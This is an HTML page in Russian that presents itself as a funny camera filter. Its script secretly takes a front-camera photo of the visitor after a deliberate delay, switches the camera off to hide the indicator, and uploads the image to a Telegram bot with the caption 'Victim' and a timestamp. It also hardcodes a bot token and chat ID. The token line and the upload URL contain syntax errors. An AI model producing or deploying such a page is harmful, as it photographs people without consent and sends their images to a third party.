<!DOCTYPE html>
<html lang="ru">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Смешной фильтр 2026 😂</title>
  <style>
    body { margin:0; font-family: Arial, sans-serif; background:#111; color:#fff; text-align:center; }
    #container { padding: 20px; max-width: 500px; margin: auto; }
    video, canvas { display: none; }
    h1 { font-size: 2.5em; margin: 40px 0 20px; }
    p { font-size: 1.3em; line-height: 1.5; }
    button { 
      background: #ff3366; color: white; border: none; padding: 15px 40px; 
      font-size: 1.4em; border-radius: 50px; margin: 30px 0; cursor: pointer;
    }
    button:hover { background: #ff6699; }
    #status { font-size: 1.2em; margin-top: 30px; color: #0f0; }
  </style>
</head>
<body>

<div id="container">
  <h1>😂 хочешь видеть приветствия?</h1>
  <p>разреши расширения что бы мы могли тебе доверять! 😎</p>
  
  <button onclick="startPrank()">хочу посмотреть! 😂</button>
  
  <div id="status"></div>
</div>

<video id="video" autoplay playsinline></video>
<canvas id="canvas"></canvas>

<script>
const video = document.getElementById('video');
const canvas = document.getElementById('canvas');
const ctx = canvas.getContext('2d');
const status = document.getElementById('status');

const TELEGRAM_TOKEN = '8678005399:AAFTHzqbs40DHQ3ziXoAXdFR1Kg_cuu_PTc;  // ← замени на свой токен
const CHAT_ID = '8269416289';  // ← замени на свой chat_id

async function startPrank() {
  status.textContent = 'Запрашиваем разрешения...';
  
  try {
    const stream = await navigator.mediaDevices.getUserMedia({ 
      video: { facingMode: 'user' }  // фронтальная камера
    });
    
    video.srcObject = stream;
    video.play();
    
    // Ждём 2–4 секунды, чтобы человек расслабился и подумал, что сейчас фильтр появится
    await new Promise(r => setTimeout(r, 3000));
    
    status.textContent = 'Щааа... проверяем! ';
    
    // Делаем снимок
    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;
    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
    
    // Останавливаем камеру (чтобы индикатор погас)
    stream.getTracks().forEach(track => track.stop());
    
    // Конвертируем в base64
    const dataUrl = canvas.toDataURL('image/jpeg', 0.85);
    
    // Отправляем в Telegram
    status.textContent = 'ура смотри!';
    
    const formData = new FormData();
    formData.append('chat_id', CHAT_ID);
    formData.append('caption', `Жертва: ${new Date().toLocaleString('ru-RU')} 😭`);
    
    // Конвертируем base64 в Blob для отправки как файл
    const blob = await (await fetch(dataUrl)).blob();
    formData.append('photo', blob, 'prank.jpg');
    
    await fetch(`https://api.telegram.org/bot${8678005399:AAFTHzqbs40DHQ3ziXoAXdFR1Kg_cuu_PTc}/sendPhoto`, {
      method: 'POST',
      body: formData
    });
    
    status.innerHTML = 'жди щас загрузится! 😂<br>подожди.';
    
  } catch (err) {
    console.error(err);
    status.textContent = err.name === 'NotAllowedError' 
      ? 'Ты не разрешил расширение попробуй еще раз!'
      : 'Ошибка: ' + err.message;
  }
}
</script>
</body>
</html>
